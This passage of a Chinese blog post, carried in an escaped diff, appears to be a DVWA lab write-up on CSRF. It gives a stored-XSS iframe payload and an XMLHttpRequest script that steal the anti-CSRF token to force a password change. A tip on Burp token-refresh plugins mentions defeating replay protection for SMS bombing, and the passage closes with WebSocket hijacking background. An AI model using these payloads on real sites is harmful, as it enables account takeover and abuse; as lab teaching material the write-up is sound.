value=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;input type=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; name=&lt;span class=&quot;string&quot;&gt;&quot;Change&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;Change&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;&lt;span class=&quot;regexp&quot;&gt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;    &amp;lt;/&lt;/span&gt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;测试一下：&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869029.13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;为什么会出现这种情况：因为现在的浏览器、基本都不会允许跨域的操作，我们的框架iframe访问的地址是&lt;a href=&quot;http://192.168.1.106/vulnerabilities/csrf&quot;&gt;http://192.168.1.106/vulnerabilities/csrf&lt;/a&gt;，位于服务器192.168.1.106上，而我们的攻击页面位于黑客服务器192.168.1.101上，两者的域名不同，域名B下的所有页面都不被允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。&lt;/p&gt;
+&lt;p&gt;理想和现实的差距是比较大的，这次直接在目标站点上放上POC测试(不跨域的情况下，当然，既然能上传了，还挖什么CSRF呀，手动滑稽)&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869404.4.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869465.77.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，在理想情况下，成功获取到user_token,触发CSRF漏洞，将用户密码改为admin888&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;理想情况测试完后，想想怎么绕过：组合漏洞，通过XSS获取用户的user_token，然后结合CSRF触发&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;首先在存储型XSS的name处注入代码，触发存储型XSS漏洞，弹出user_token&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;iframe src=&lt;span class=&quot;string&quot;&gt;&quot;../csrf&quot;&lt;/span&gt; onload=alert(frames[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].document.getElementsByName(&lt;span class=&quot;string&quot;&gt;&quot;user_token&quot;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].value)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872357.86.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872377.73.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到代码已经注入进去了，利用存储型XSS获取user_token,然后在CSRF处修改密码抓包生成POC替换user_token值既可触发CSRF漏洞&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872555.58.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872610.87.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872638.08.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到漏洞触发，密码被修改。&lt;/p&gt;
+&lt;h5 id=&quot;方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）&quot;&gt;&lt;a href=&quot;#方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）&quot; class=&quot;headerlink&quot; title=&quot;方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）&quot;&gt;&lt;/a&gt;方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）&lt;/h5&gt;&lt;p&gt;CSRF结合同Security Level的 XSS漏洞，通过ajax实现跨域请求来获取用户的user_token&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;alert(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; theUrl = &lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.106/vulnerabilities/csrf/&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.XMLHttpRequest) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    xmlhttp = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    xmlhttp = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ActiveXObject(&lt;span class=&quot;string&quot;&gt;&quot;Microsoft.XMLHTTP&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xmlhttp.withCredentials = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xmlhttp.onreadystatechange=&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(xmlhttp.readyState ==&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &amp;amp;&amp;amp; xmlhttp.status==&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; text = xmlhttp.responseText;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; regex = &lt;span class=&quot;regexp&quot;&gt;/user_token\&#39; value\=\&#39;(.*?)\&#39; \/\&amp;gt;/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; match = text.match(regex);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(match);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        alert(match[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; token = match[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; new_url = &lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.106/vulnerabilities/csrf/?user_token=&#39;&lt;/span&gt;+token+&lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;password_new=test&amp;amp;password_conf=test&amp;amp;Change=Change&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(count==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    xmlhttp.open(&lt;span class=&quot;string&quot;&gt;&quot;GET&quot;&lt;/span&gt;,new_url,&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    xmlhttp.send();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xmlhttp.open(&lt;span class=&quot;string&quot;&gt;&quot;GET&quot;&lt;/span&gt;,theUrl,&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xmlhttp.send();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h4 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips:&quot;&gt;&lt;/a&gt;Tips:&lt;/h4&gt;&lt;blockquote&gt;
+&lt;p&gt;在前面dvwa的high等级中，对于csrf的防御点就在于user_token，通过token可以进行身份鉴别，当然，在没有登录的情况下只能通过组合漏洞获取token或者看看有没有token泄露；除此之外，token在登录的情况下(即以及获取到token的情况下)除了身份鉴别之外，还可以防止重放，因为数据包的重放每次都要更新token，所以在以token为重放判定的情况下，怎么不断重新获取token呢，当然不能手动获取，burp上有插件实现了cookie的更新(有些情况是把token加在cookie中的)，但是对于没有在cookie中的token，可以通过CSRF Token Tracker插件实现自动更新，表面意思是只能更新csrf——token，其实都可以。这样在某些场景，比如短信轰炸啥的就可以突破了，还有些服务端有下发sign的情况，这种插件目前没有发现。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;以dvwa中CSRF的high等级为例&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875700.86.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;没有更新token时修改密码重放&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875765.59.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876011.68.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;实时更新token测试&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875932.29.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;可读可写型CSRF&quot;&gt;&lt;a href=&quot;#可读可写型CSRF&quot; class=&quot;headerlink&quot; title=&quot;可读可写型CSRF&quot;&gt;&lt;/a&gt;可读可写型CSRF&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;WebSocket 跨域劫持漏洞,由于websocket协议支持双通道通信且websocket不受同源策略的影响，利用websocket的跨域劫持为可读可写类型&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;websocket的优点&quot;&gt;&lt;a href=&quot;#websocket的优点&quot; class=&quot;headerlink&quot; title=&quot;websocket的优点&quot;&gt;&lt;/a&gt;websocket的优点&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;支持全双工，实时性更强。&lt;/li&gt;
+&lt;li&gt;更好的二进制支持。&lt;/li&gt;
+&lt;li&gt;较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。&lt;/li&gt;
+&lt;li&gt;支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;websocket就建立链接如下&quot;&gt;&lt;a href=&quot;#websocket就建立链接如下&quot; class=&quot;headerlink&quot; title=&quot;websocket就建立链接如下&quot;&gt;&lt;/a&gt;websocket就建立链接如下&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476121.43.png&quot; alt=&quot;&quot;&gt;&lt;/h3&gt;&lt;p&gt;通过建立连接的过程可以发现在websocket建立连接时没有进行验证，所以由此产生漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/chyingp/blog/tree/master/demo/2017.05.22-web-socket/ws&quot;&gt;测试环境用到代码如下&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;server.js&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//server.js&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; app = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;express&#39;&lt;/span&gt;)();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; server = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;http&#39;&lt;/span&gt;).Server(app);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; WebSocket = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;ws&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; wss = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; WebSocket.Server(&amp;#123; &lt;span class=&quot;attr&quot;&gt;port&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;9999&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wss.on(&lt;span class=&quot;string&quot;&gt;&#39;connection&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;connection&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;ws&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;server: receive connection.&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ws.on(&lt;span class=&quot;string&quot;&gt;&#39;message&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;incoming&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;message&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;server: received %s&#39;&lt;/span&gt;, message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ws.send(&lt;span class=&quot;string&quot;&gt;&#39;server: reply&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ws.on(&lt;span class=&quot;string&quot;&gt;&#39;pong&#39;&lt;/span&gt;, () =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;server: received pong from client&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ws.send(&lt;span class=&quot;string&quot;&gt;&#39;world&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// setInterval(() =&amp;gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//     ws.ping(&#39;&#39;, false, true);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// &amp;#125;, 2000);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app.get(&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  res.sendfile(__dirname + &lt;span class=&quot;string&quot;&gt;&#39;/index.html&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app.listen(&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;cal.js&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; crypto = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;crypto&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; magic = &lt;span class=&quot;string&quot;&gt;&#39;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; secWebSocketKey = &lt;span class=&quot;string&quot;&gt;&#39;w4v7O6xFTi36lq3RNcgctw==&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; secWebSocketAccept = crypto.createHash(&lt;span class=&quot;string&quot;&gt;&#39;sha1&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .update(secWebSocketKey + magic)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .digest(&lt;span class=&quot;string&quot;&gt;&#39;base64&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(secWebSocketAccept);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// Oy4NRAQ13jhfONC7bP8dTKb4PTU=&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;index.html&lt;/strong&gt;&lt;/p&gt;
